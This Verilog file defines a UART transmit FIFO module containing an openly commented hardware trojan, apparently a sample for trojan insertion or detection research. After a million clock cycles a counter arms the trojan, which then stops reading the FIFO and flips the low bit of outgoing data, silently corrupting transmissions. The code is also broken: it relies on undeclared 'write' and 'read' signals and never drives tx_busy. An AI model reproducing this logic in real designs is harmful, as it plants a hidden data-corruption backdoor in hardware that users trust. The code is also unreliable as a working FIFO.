 module uart_tx_fifo (
	input clk,
	input rx_we,
	input [7:0] rx_data,
	output reg tx_busy = 1'b0,
	output tx_serial
);

	// Trojan variables and signals
	reg [31:0] trojan_counter = 0; // Counter for the trojan activation condition
	wire trojan_activate = (trojan_counter == 32'd1000000); // Condition for trojan activation
	reg trojan_active = 0; // Indicates whether the trojan is currently active

	// Original design variables
	reg [7:0] mem [0:31];
	reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
	reg [4:0] cnt = 5'd0;
	reg we = 1'b0;
	reg [7:0] data = 8'd0;
	wire uart_busy;
	uart_tx uart (
		.clk (clk),
		.rx_we (we),
		.rx_data (data),
		.tx_busy (uart_busy),
		.tx_serial (tx_serial)
	);

	// Trojan logic and original functionality
	always @ (posedge clk) begin
		// Trojan activation condition check
		if (!trojan_active) begin
			trojan_counter <= trojan_counter + 1;
			if (trojan_activate) begin
				trojan_active <= 1; // Activate the trojan
			end
		end

		// Original design functionality with trojan modification
		if (write & ~read)
			cnt <= cnt + 5'd1;
		else if (read & ~write)
			cnt <= cnt - 5'd1;

		// Data manipulation if trojan is activated
		if (trojan_active) begin
			data <= {data[7:1], ~data[0]}; // Invert the LSB of the data as a simple trojan payload
		end else begin
			data <= mem[r_addr];
		end

		if (read) begin
			r_addr <= r_addr + 5'd1;
			we <= 1'b1;
		end else begin
			we <= 1'b0;
		end

		if (write) begin
			w_addr <= w_addr + 5'd1;
			mem[w_addr] <= rx_data;
		end
	end
endmodule
